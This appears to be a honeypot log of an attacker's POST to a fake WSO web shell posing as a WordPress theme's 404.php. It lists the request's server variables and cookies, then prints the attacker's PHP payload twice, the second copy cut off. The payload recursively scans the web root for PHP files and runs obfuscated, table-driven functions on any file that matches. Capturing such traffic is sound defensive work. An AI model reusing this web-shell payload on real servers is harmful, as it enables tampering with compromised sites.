
_SERVER
Array
(
    [UNIQUE_ID] => XYoal1Bp2JT6rNKXjhK6VwAAACU
    [SCRIPT_URL] => /wp-content/themes/sketch/404.php
    [SCRIPT_URI] => http://stratigery.com/wp-content/themes/sketch/404.php
    [HTTP_HOST] => stratigery.com.
    [CONTENT_LENGTH] => 36965
    [HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.8
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
    [HTTP_REFERER] => http://stratigery.com./wp-content/themes/sketch/404.php
    [HTTP_COOKIE] => 7d20da1b086517f37a8ab60ec8316d91=d9fdca2cb0379f51df4ca56d47a91f05; ef6256f907cd86f59ac446eb46c95275=ef6256f907cd86f59ac446eb46c95275
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.41 (Unix) PHP/7.3.9
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 192.185.4.65
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger8@gmail.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 26586
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.0
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wp-content/themes/sketch/404.php
    [SCRIPT_NAME] => /wp-content/themes/sketch/404.php
    [PHP_SELF] => /wp-content/themes/sketch/404.php
    [REQUEST_TIME_FLOAT] => 1569331863.974
    [REQUEST_TIME] => 1569331863
)

_REQUEST
Array
(
    [a] => RC
    [p1] => eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czoxMDoicnhtZXhndWJoeSI7aToyO3M6NDoiZ3BkeCI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NjoicnhjZ2V6IjtpOjI7czoxMToiZ2hxZXVsa3RucGciO31pOjI7YTozOntpOjA7aToxNTtpOjE7czo0OiJyZndoIjtpOjI7czoxMDoiZ2ZmeHRnYm9xcyI7fWk6MzthOjM6e2k6MDtpOjE4O2k6MTtzOjEwOiJybnh3a3FkbWdtIjtpOjI7czo3OiJnZ3dscmRhIjt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6NzoicmJ2Z2lpbCI7aToyO3M6NzoiZ2RpZGJpbiI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjc6InJreXNwd2MiO2k6MjtzOjQ6ImdlbHYiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo3OiJybmlhZmtqIjtpOjI7czo0OiJnYm9pIjt9aTo3O2E6Mzp7aTowO2k6NTQ7aToxO3M6OToicmV6ZGlreGp4IjtpOjI7czoxMToiZ3NkdXd0dXNkanIiO31pOjg7YTozOntpOjA7aTo2MDtpOjE7czo2OiJydnFqYWIiO2k6MjtzOjQ6ImdqbXgiO31pOjk7YTozOntpOjA7aTo4OTtpOjE7czo2OiJyZmNuam4iO2k6MjtzOjExOiJnbnRuaHBxbHJzdiI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6NzoicmVjcm1vcyI7aToyO3M6NToiZ2lucGoiO31pOjExO2E6Mzp7aTowO2k6MTEwO2k6MTtzOjEwOiJybGZkbmJncnhuIjtpOjI7czo4OiJnbG9sYXVpayI7fWk6MTI7YTozOntpOjA7aToxMTE7aToxO3M6ODoicmlzc2lpYm4iO2k6MjtzOjQ6ImdrcWsiO31pOjEzO2E6Mzp7aTowO2k6MTEyO2k6MTtzOjY6InJ5bHFxcyI7aToyO3M6ODoiZ3VyeHRqb2QiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjk6InJrYm5ydXd2cyI7aToyO3M6OToiZ2FjY2tjZXR4Ijt9aToxNTthOjM6e2k6MDtpOjExODtpOjE7czo1OiJyZXhhdSI7aToyO3M6NToiZ2xwemEiO31pOjE2O2E6Mzp7aTowO2k6MTI2O2k6MTtzOjU6InJ4dXBtIjtpOjI7czo5OiJneWR5a29pZWwiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjk6InJwZ2NnamNjcCI7aToyO3M6MTE6Imd6bWRyeWtrbWJrIjt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czo0OiJyeGZzIjtpOjI7czo0OiJndGRyIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo4OiJydXZtYnpwaCI7aToyO3M6NDoiZ3NkaSI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NzoicnFtbGZ2dCI7aToyO3M6MTA6ImdqemNhYmdkZ3EiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjU6InJwY3J3IjtpOjI7czo5OiJnY2RwcGx0ZW4iO31pOjIyO2E6Mzp7aTowO2k6MTU3O2k6MTtzOjg6InJvdmVoYmtnIjtpOjI7czo4OiJnZW1ibXhldyI7fWk6MjM7YTozOntpOjA7aToxNjM7aToxO3M6NDoicm12eiI7aToyO3M6ODoiZ2ZtdXNxY2MiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjU6InJ0aXZyIjtpOjI7czo5OiJnbWxqaW5yc2YiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjU6InJmZmN3IjtpOjI7czoxMDoiZ21nbGF0c3J2eCI7fWk6MjY7YTozOntpOjA7aToxNzk7aToxO3M6ODoicmlkcmNodmIiO2k6MjtzOjExOiJnenFsamJkcWpseiI7fWk6Mjc7YTozOntpOjA7aToxODc7aToxO3M6OToicmNobmVoeHVyIjtpOjI7czo1OiJndmJlayI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6MTA6InJhZGFqd2dzYXkiO2k6MjtzOjExOiJnZ3N3bnJ3cnVwdyI7fWk6Mjk7YTozOntpOjA7aToxOTI7aToxO3M6NDoicmlkaCI7aToyO3M6MTE6ImdiZWV0bHhzc2diIjt9aTozMDthOjM6e2k6MDtpOjE5NjtpOjE7czo5OiJyYnZxcGVweG4iO2k6MjtzOjY6Imd4eGZ0eCI7fWk6MzE7YTozOntpOjA7aToxOTg7aToxO3M6ODoicmRyZ2Vhd2wiO2k6MjtzOjY6Imd1dmFmaiI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6NDoicnBjZCI7aToyO3M6NToiZ3NoYXIiO31pOjMzO2E6Mzp7aTowO2k6MjAwO2k6MTtzOjc6InJsa29xd20iO2k6MjtzOjk6ImdnYmN3bGR5cSI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6OToicnZwcWh3Y3RhIjtpOjI7czo1OiJnbnVmcyI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6MTE6InJvd3ZwaW9wZm94IjtpOjI7czoxMToiZ3l5dnNtZnRqa2QiO31pOjM2O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjY6InJzeGFheSI7aToyO3M6MTE6Imd1bHVsa29reGRoIjt9aTozNzthOjM6e2k6MDtpOjIwOTtpOjE7czo3OiJyandna2JjIjtpOjI7czo3OiJnYnFtanBkIjt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo3OiJyaWtna2ZmIjtpOjI7czo4OiJncWRuaWtqdCI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6OToicnBpcnpwamt0IjtpOjI7czo2OiJnamxvYW8iO31pOjQwO2E6Mzp7aTowO2k6MjEzO2k6MTtzOjg6InJ2YnF5anVwIjtpOjI7czo0OiJndHp5Ijt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czoxMToicmV6ZXNoZGlzaWUiO2k6MjtzOjU6ImdkYnZsIjt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czoxMToicnhvaHpyeWpsdXAiO2k6MjtzOjg6ImdvaGdrdmdkIjt9aTo0MzthOjM6e2k6MDtpOjIxNjtpOjE7czo5OiJybWp2b2RvYmUiO2k6MjtzOjExOiJnZWtrdnFmb3dwcSI7fWk6NDQ7YTozOntpOjA7aToyMTc7aToxO3M6MTA6InJ5d3Z1aWpqZXAiO2k6MjtzOjk6ImdydWpteGtzeCI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6NzoicmFmaXlpcSI7aToyO3M6MTA6Imd3am1kanVudGQiO31pOjQ2O2E6Mzp7aTowO2k6MjIxO2k6MTtzOjg6InJyeGJ2bXhlIjtpOjI7czo0OiJndmJoIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czo3OiJycHN2ZGh6IjtpOjI7czoxMToiZ2dvZXN1bWNrb3QiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjk6InJxd2d3cmhtZyI7aToyO3M6NjoiZ3hxZ2N1Ijt9aTo0OTthOjM6e2k6MDtpOjIyNDtpOjE7czo5OiJyd3FnbmtyZmsiO2k6MjtzOjQ6Imd0c3YiO31pOjUwO2E6Mzp7aTowO2k6MjI1O2k6MTtzOjExOiJyd2R5bWVucHd3cSI7aToyO3M6NDoiZ3BtYiI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6MTE6InJnanJyeHB1d21pIjtpOjI7czo4OiJnYXpiZ3VubiI7fWk6NTI7YTozOntpOjA7aToyMzI7aToxO3M6ODoicnJmdWZ5bG0iO2k6MjtzOjU6ImdtcmN3Ijt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czo1OiJyZXh2YyI7aToyO3M6ODoiZ3dqcnRvc2giO31pOjU0O2E6Mzp7aTowO2k6MjM2O2k6MTtzOjEwOiJydXJ4ZGl2dWdsIjtpOjI7czo3OiJneXJnYXdwIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo5OiJyZWtobXppdWQiO2k6MjtzOjQ6Imd3Z3IiO31pOjU2O2E6Mzp7aTowO2k6MjM4O2k6MTtzOjY6InJtaWR6aiI7aToyO3M6NjoiZ21uaGJhIjt9aTo1NzthOjM6e2k6MDtpOjIzOTtpOjE7czo4OiJydGR6dGd5biI7aToyO3M6NzoiZ254aWt4ZiI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6ODoicmt3cnFud2siO2k6MjtzOjU6ImdkemdlIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czo0OiJyeXl3IjtpOjI7czo1OiJnYWpvcCI7fWk6NjA7YTozOntpOjA7aToyNDI7aToxO3M6MTA6InJzenZ6c3dmbHQiO2k6MjtzOjk6ImdhbXVvc3FpeSI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6NDoicmJhayI7aToyO3M6MTA6Imd0enpzZXVtcGUiO31pOjYyO2E6Mzp7aTowO2k6MjQ0O2k6MTtzOjExOiJyaXBmZndoYndheCI7aToyO3M6NzoiZ21wY2F4dCI7fWk6NjM7YTozOntpOjA7aToyNDU7aToxO3M6ODoicnFjem9rZWEiO2k6MjtzOjY6Imdlc290diI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6MTA6InJvYWtmdnRjbHUiO2k6MjtzOjU6ImdjeW10Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMDoicmR0YmJoc2R0dyI7aToyO3M6NDoiZ2VnbCI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6NzoicnB6eXZkdyI7aToyO3M6MTA6ImdidmJjZ3BoYXUiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjEwOiJya211eHd4dmJrIjtpOjI7czo5OiJnY2JlZGdwbGEiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjc6InJtdHBueWoiO2k6MjtzOjY6ImdoYmxocCI7fWk6Njk7YTozOntpOjA7aToyNTE7aToxO3M6MTA6InJ1YXVsdWZha2siO2k6MjtzOjc6ImdxdmRrYXgiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjEwOiJyenhzb3FrZnV4IjtpOjI7czo5OiJneHVxY2t5dmwiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjEwOiJybXFkZndrZWRlIjtpOjI7czo0OiJnamt6Ijt9aTo3MjthOjM6e2k6MDtpOjI1NDtpOjE7czoxMToicmV3aHVicHV0bGgiO2k6MjtzOjU6Imd4dm9iIjt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czo0OiJyZXJjIjtpOjI7czo1OiJnbWpuaSI7fWk6NzQ7YTozOntpOjA7aToyNTY7aToxO3M6NjoicnVqanZqIjtpOjI7czo0OiJnY2R6Ijt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo2OiJycWt4eGYiO2k6MjtzOjQ6ImdkcnEiO31pOjc2O2E6Mzp7aTowO2k6MjU4O2k6MTtzOjExOiJyaXF3dmFqd2ZkciI7aToyO3M6MTA6ImdudmR6c2FsbGsiO31pOjc3O2E6Mzp7aTowO2k6MjU5O2k6MTtzOjU6InJ1b3JzIjtpOjI7czo2OiJnbWt2ZG0iO31pOjc4O2E6Mzp7aTowO2k6MjYwO2k6MTtzOjEwOiJyZnVrbmVlcmRmIjtpOjI7czo3OiJnemV1aWNxIjt9aTo3OTthOjM6e2k6MDtpOjI2MTtpOjE7czoxMToicnRnYWF4eGNhb3giO2k6MjtzOjg6ImdsbnN0d2VoIjt9aTo4MDthOjM6e2k6MDtpOjI2MjtpOjE7czoxMToicmJ4Y2FkZGt3Zm8iO2k6MjtzOjc6Imd3d250dXAiO31pOjgxO2E6Mzp7aTowO2k6MjYzO2k6MTtzOjQ6InJobXkiO2k6MjtzOjk6ImdrdXFxcHhqZSI7fWk6ODI7YTozOntpOjA7aToyNjQ7aToxO3M6NjoicnZ6a3ZhIjtpOjI7czo4OiJnanlpdmd3dyI7fWk6ODM7YTozOntpOjA7aToyNjU7aToxO3M6NDoicmx2cCI7aToyO3M6NzoiZ2dreXVzcCI7fWk6ODQ7YTozOntpOjA7aToyNjY7aToxO3M6NDoicnR2cSI7aToyO3M6NDoiZ2dhdiI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();
)

_COOKIE
 Array
(
    [7d20da1b086517f37a8ab60ec8316d91] => d9fdca2cb0379f51df4ca56d47a91f05
    [ef6256f907cd86f59ac446eb46c95275] => ef6256f907cd86f59ac446eb46c95275
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com./wp-content/themes/sketch
Acting as WSO, login cookie.
a = RC
p1 = eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czoxMDoicnhtZXhndWJoeSI7aToyO3M6NDoiZ3BkeCI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NjoicnhjZ2V6IjtpOjI7czoxMToiZ2hxZXVsa3RucGciO31pOjI7YTozOntpOjA7aToxNTtpOjE7czo0OiJyZndoIjtpOjI7czoxMDoiZ2ZmeHRnYm9xcyI7fWk6MzthOjM6e2k6MDtpOjE4O2k6MTtzOjEwOiJybnh3a3FkbWdtIjtpOjI7czo3OiJnZ3dscmRhIjt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6NzoicmJ2Z2lpbCI7aToyO3M6NzoiZ2RpZGJpbiI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjc6InJreXNwd2MiO2k6MjtzOjQ6ImdlbHYiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo3OiJybmlhZmtqIjtpOjI7czo0OiJnYm9pIjt9aTo3O2E6Mzp7aTowO2k6NTQ7aToxO3M6OToicmV6ZGlreGp4IjtpOjI7czoxMToiZ3NkdXd0dXNkanIiO31pOjg7YTozOntpOjA7aTo2MDtpOjE7czo2OiJydnFqYWIiO2k6MjtzOjQ6ImdqbXgiO31pOjk7YTozOntpOjA7aTo4OTtpOjE7czo2OiJyZmNuam4iO2k6MjtzOjExOiJnbnRuaHBxbHJzdiI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6NzoicmVjcm1vcyI7aToyO3M6NToiZ2lucGoiO31pOjExO2E6Mzp7aTowO2k6MTEwO2k6MTtzOjEwOiJybGZkbmJncnhuIjtpOjI7czo4OiJnbG9sYXVpayI7fWk6MTI7YTozOntpOjA7aToxMTE7aToxO3M6ODoicmlzc2lpYm4iO2k6MjtzOjQ6ImdrcWsiO31pOjEzO2E6Mzp7aTowO2k6MTEyO2k6MTtzOjY6InJ5bHFxcyI7aToyO3M6ODoiZ3VyeHRqb2QiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjk6InJrYm5ydXd2cyI7aToyO3M6OToiZ2FjY2tjZXR4Ijt9aToxNTthOjM6e2k6MDtpOjExODtpOjE7czo1OiJyZXhhdSI7aToyO3M6NToiZ2xwemEiO31pOjE2O2E6Mzp7aTowO2k6MTI2O2k6MTtzOjU6InJ4dXBtIjtpOjI7czo5OiJneWR5a29pZWwiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjk6InJwZ2NnamNjcCI7aToyO3M6MTE6Imd6bWRyeWtrbWJrIjt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czo0OiJyeGZzIjtpOjI7czo0OiJndGRyIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo4OiJydXZtYnpwaCI7aToyO3M6NDoiZ3NkaSI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NzoicnFtbGZ2dCI7aToyO3M6MTA6ImdqemNhYmdkZ3EiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjU6InJwY3J3IjtpOjI7czo5OiJnY2RwcGx0ZW4iO31pOjIyO2E6Mzp7aTowO2k6MTU3O2k6MTtzOjg6InJvdmVoYmtnIjtpOjI7czo4OiJnZW1ibXhldyI7fWk6MjM7YTozOntpOjA7aToxNjM7aToxO3M6NDoicm12eiI7aToyO3M6ODoiZ2ZtdXNxY2MiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjU6InJ0aXZyIjtpOjI7czo5OiJnbWxqaW5yc2YiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjU6InJmZmN3IjtpOjI7czoxMDoiZ21nbGF0c3J2eCI7fWk6MjY7YTozOntpOjA7aToxNzk7aToxO3M6ODoicmlkcmNodmIiO2k6MjtzOjExOiJnenFsamJkcWpseiI7fWk6Mjc7YTozOntpOjA7aToxODc7aToxO3M6OToicmNobmVoeHVyIjtpOjI7czo1OiJndmJlayI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6MTA6InJhZGFqd2dzYXkiO2k6MjtzOjExOiJnZ3N3bnJ3cnVwdyI7fWk6Mjk7YTozOntpOjA7aToxOTI7aToxO3M6NDoicmlkaCI7aToyO3M6MTE6ImdiZWV0bHhzc2diIjt9aTozMDthOjM6e2k6MDtpOjE5NjtpOjE7czo5OiJyYnZxcGVweG4iO2k6MjtzOjY6Imd4eGZ0eCI7fWk6MzE7YTozOntpOjA7aToxOTg7aToxO3M6ODoicmRyZ2Vhd2wiO2k6MjtzOjY6Imd1dmFmaiI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6NDoicnBjZCI7aToyO3M6NToiZ3NoYXIiO31pOjMzO2E6Mzp7aTowO2k6MjAwO2k6MTtzOjc6InJsa29xd20iO2k6MjtzOjk6ImdnYmN3bGR5cSI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6OToicnZwcWh3Y3RhIjtpOjI7czo1OiJnbnVmcyI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6MTE6InJvd3ZwaW9wZm94IjtpOjI7czoxMToiZ3l5dnNtZnRqa2QiO31pOjM2O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjY6InJzeGFheSI7aToyO3M6MTE6Imd1bHVsa29reGRoIjt9aTozNzthOjM6e2k6MDtpOjIwOTtpOjE7czo3OiJyandna2JjIjtpOjI7czo3OiJnYnFtanBkIjt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo3OiJyaWtna2ZmIjtpOjI7czo4OiJncWRuaWtqdCI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6OToicnBpcnpwamt0IjtpOjI7czo2OiJnamxvYW8iO31pOjQwO2E6Mzp7aTowO2k6MjEzO2k6MTtzOjg6InJ2YnF5anVwIjtpOjI7czo0OiJndHp5Ijt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czoxMToicmV6ZXNoZGlzaWUiO2k6MjtzOjU6ImdkYnZsIjt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czoxMToicnhvaHpyeWpsdXAiO2k6MjtzOjg6ImdvaGdrdmdkIjt9aTo0MzthOjM6e2k6MDtpOjIxNjtpOjE7czo5OiJybWp2b2RvYmUiO2k6MjtzOjExOiJnZWtrdnFmb3dwcSI7fWk6NDQ7YTozOntpOjA7aToyMTc7aToxO3M6MTA6InJ5d3Z1aWpqZXAiO2k6MjtzOjk6ImdydWpteGtzeCI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6NzoicmFmaXlpcSI7aToyO3M6MTA6Imd3am1kanVudGQiO31pOjQ2O2E6Mzp7aTowO2k6MjIxO2k6MTtzOjg6InJyeGJ2bXhlIjtpOjI7czo0OiJndmJoIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czo3OiJycHN2ZGh6IjtpOjI7czoxMToiZ2dvZXN1bWNrb3QiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjk6InJxd2d3cmhtZyI7aToyO3M6NjoiZ3hxZ2N1Ijt9aTo0OTthOjM6e2k6MDtpOjIyNDtpOjE7czo5OiJyd3FnbmtyZmsiO2k6MjtzOjQ6Imd0c3YiO31pOjUwO2E6Mzp7aTowO2k6MjI1O2k6MTtzOjExOiJyd2R5bWVucHd3cSI7aToyO3M6NDoiZ3BtYiI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6MTE6InJnanJyeHB1d21pIjtpOjI7czo4OiJnYXpiZ3VubiI7fWk6NTI7YTozOntpOjA7aToyMzI7aToxO3M6ODoicnJmdWZ5bG0iO2k6MjtzOjU6ImdtcmN3Ijt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czo1OiJyZXh2YyI7aToyO3M6ODoiZ3dqcnRvc2giO31pOjU0O2E6Mzp7aTowO2k6MjM2O2k6MTtzOjEwOiJydXJ4ZGl2dWdsIjtpOjI7czo3OiJneXJnYXdwIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo5OiJyZWtobXppdWQiO2k6MjtzOjQ6Imd3Z3IiO31pOjU2O2E6Mzp7aTowO2k6MjM4O2k6MTtzOjY6InJtaWR6aiI7aToyO3M6NjoiZ21uaGJhIjt9aTo1NzthOjM6e2k6MDtpOjIzOTtpOjE7czo4OiJydGR6dGd5biI7aToyO3M6NzoiZ254aWt4ZiI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6ODoicmt3cnFud2siO2k6MjtzOjU6ImdkemdlIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czo0OiJyeXl3IjtpOjI7czo1OiJnYWpvcCI7fWk6NjA7YTozOntpOjA7aToyNDI7aToxO3M6MTA6InJzenZ6c3dmbHQiO2k6MjtzOjk6ImdhbXVvc3FpeSI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6NDoicmJhayI7aToyO3M6MTA6Imd0enpzZXVtcGUiO31pOjYyO2E6Mzp7aTowO2k6MjQ0O2k6MTtzOjExOiJyaXBmZndoYndheCI7aToyO3M6NzoiZ21wY2F4dCI7fWk6NjM7YTozOntpOjA7aToyNDU7aToxO3M6ODoicnFjem9rZWEiO2k6MjtzOjY6Imdlc290diI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6MTA6InJvYWtmdnRjbHUiO2k6MjtzOjU6ImdjeW10Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMDoicmR0YmJoc2R0dyI7aToyO3M6NDoiZ2VnbCI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6NzoicnB6eXZkdyI7aToyO3M6MTA6ImdidmJjZ3BoYXUiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjEwOiJya211eHd4dmJrIjtpOjI7czo5OiJnY2JlZGdwbGEiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjc6InJtdHBueWoiO2k6MjtzOjY6ImdoYmxocCI7fWk6Njk7YTozOntpOjA7aToyNTE7aToxO3M6MTA6InJ1YXVsdWZha2siO2k6MjtzOjc6ImdxdmRrYXgiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjEwOiJyenhzb3FrZnV4IjtpOjI7czo5OiJneHVxY2t5dmwiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjEwOiJybXFkZndrZWRlIjtpOjI7czo0OiJnamt6Ijt9aTo3MjthOjM6e2k6MDtpOjI1NDtpOjE7czoxMToicmV3aHVicHV0bGgiO2k6MjtzOjU6Imd4dm9iIjt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czo0OiJyZXJjIjtpOjI7czo1OiJnbWpuaSI7fWk6NzQ7YTozOntpOjA7aToyNTY7aToxO3M6NjoicnVqanZqIjtpOjI7czo0OiJnY2R6Ijt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo2OiJycWt4eGYiO2k6MjtzOjQ6ImdkcnEiO31pOjc2O2E6Mzp7aTowO2k6MjU4O2k6MTtzOjExOiJyaXF3dmFqd2ZkciI7aToyO3M6MTA6ImdudmR6c2FsbGsiO31pOjc3O2E6Mzp7aTowO2k6MjU5O2k6MTtzOjU6InJ1b3JzIjtpOjI7czo2OiJnbWt2ZG0iO31pOjc4O2E6Mzp7aTowO2k6MjYwO2k6MTtzOjEwOiJyZnVrbmVlcmRmIjtpOjI7czo3OiJnemV1aWNxIjt9aTo3OTthOjM6e2k6MDtpOjI2MTtpOjE7czoxMToicnRnYWF4eGNhb3giO2k6MjtzOjg6ImdsbnN0d2VoIjt9aTo4MDthOjM6e2k6MDtpOjI2MjtpOjE7czoxMToicmJ4Y2FkZGt3Zm8iO2k6MjtzOjc6Imd3d250dXAiO31pOjgxO2E6Mzp7aTowO2k6MjYzO2k6MTtzOjQ6InJobXkiO2k6MjtzOjk6ImdrdXFxcHhqZSI7fWk6ODI7YTozOntpOjA7aToyNjQ7aToxO3M6NjoicnZ6a3ZhIjtpOjI7czo4OiJnanlpdmd3dyI7fWk6ODM7YTozOntpOjA7aToyNjU7aToxO3M6NDoicmx2cCI7aToyO3M6NzoiZ2dreXVzcCI7fWk6ODQ7YTozOntpOjA7aToyNjY7aToxO3M6NDoicnR2cSI7aToyO3M6NDoiZ2dhdiI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

